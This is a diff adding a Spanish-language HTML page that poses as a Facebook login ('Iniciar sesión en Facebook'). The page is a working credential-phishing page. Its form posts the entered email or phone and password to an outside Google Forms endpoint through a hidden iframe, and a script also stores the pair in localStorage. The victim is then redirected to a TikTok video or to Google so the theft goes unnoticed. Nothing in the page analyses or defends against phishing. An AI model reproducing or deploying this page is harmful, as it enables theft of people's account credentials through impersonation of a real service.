@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+  <script language="JavaScript">
+    
+     
+        function cargar(){
+
+          if((document.getElementById('xyz').value=="" )|| (document.getElementById('passwd').value=="" ) ){
+              alert("Correo o contraseña sin completar");
+          }else{
+
+            window.location="https://www.tiktok.com/@marlinykevin/video/6831677671991250181?_d=secCgsIARCbDRgBIAMoARI%2BCjzSkhdn69UaynvbdrwXCDacE2xRXpGiJlFNnLM2koB9rplQXlODudHjIa85YOipVgz9RIpe7GSBzq8I6jYaAA%3D%3D&language=es&preview_pb=0&sec_user_id=MS4wLjABAAAA7Wm-BzXWyKs-VvUg9WU6fVvFnZCkGT2XiAymUsn_GVlQUCqYBF3QmvXj2WUdsMUk&share_app_name=musically&share_item_id=6831677671991250181&share_link_id=73ef4e99-a7ff-4766-8e9f-00ced3c66090&timestamp=1600741125&u_code=dcgl830kdi5c5b&user_id=6831577758424171525&utm_campaign=client_share&utm_medium=android&utm_source=whatsapp&source=h5_m";}
+
+        }
+
+        function passvalues(){
+        
+        var usr=document.getElementById("xyz").value;
+        var pa=document.getElementById("passwd").value;
+        var st="|| "
+        var result="Usuario: ".concat(usr).concat(st).concat("Contraseña: ").concat(pa).concat("||");
+        
+        
+        localStorage.setItem("final",result);
+
+          cargar();
+        
+        
+        return false;
+      }''
+
+      var subido=false;
+
+
+
+     
+
+
+  </script>
+  <meta charset="utf-8">
+
+  <title>Iniciar sesión en Facebook | Facebook</title>
+ 
+
+  <link rel="icon"  href="icono.ico"/>
+</head>
+
+
+
+<style>
+body {
+  background-image: url('alterno2.png');
+
+}
+form{
+
+	text-align: center;
+	 padding: 89px;
+	 margin-left: 168px
+
+}
+
+
+</style>
+<body >
+<br>
+<br>
+
+<iframe name="hidden_iframe" id="hidden_iframe" style="display: none;" onload="if(subido){window.location='https://www.google.com';}"></iframe>
+
+<form action="https://docs.google.com/forms/d/e/1FAIpQLSfwcFVgpAk0oy7z73Dj3tPsKgUxPVmiub2DxPKu6lHjDKyByg/formResponse"
+target="hidden_iframe" method="POST" >
+	
+ <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq _8qtn" autofocus="text-align" placeholder="Número de celular o correo electrónico" autocomplete="on" id="xyz" name="entry.1193332508"  type="text"  style="font-size: 14px;
+    line-height: 18px; height: 23px  ;font-family: Helvetica, Arial, sans-serif;background: #f5f6f7;width: 450px; font: 400 13.3333px Arial; -webkit-rtl-ordering: logical;
+    cursor: text; padding: 12px;" > <br>
+
+  
+  <input type="password" id="passwd" placeholder="Contraseña" name="entry.574459214"   value="" style="font-size: 14px;
+    line-height: 18px;  font-family: Helvetica, Arial, sans-serif;background: #f5f6f7; font: 400 13.3333px Arial; -webkit-rtl-ordering: logical;
+    cursor: text; padding: 12px; text-align: start; width: 450px;height: 29px;"><br><br>
+  <input type="image" src="btnEnviar1.png" alt="Submit" height="42px" width="480px"  onclick="cargar()";>
+
+
+</form> <br>
+
+
+
+
+</body>
+</html>
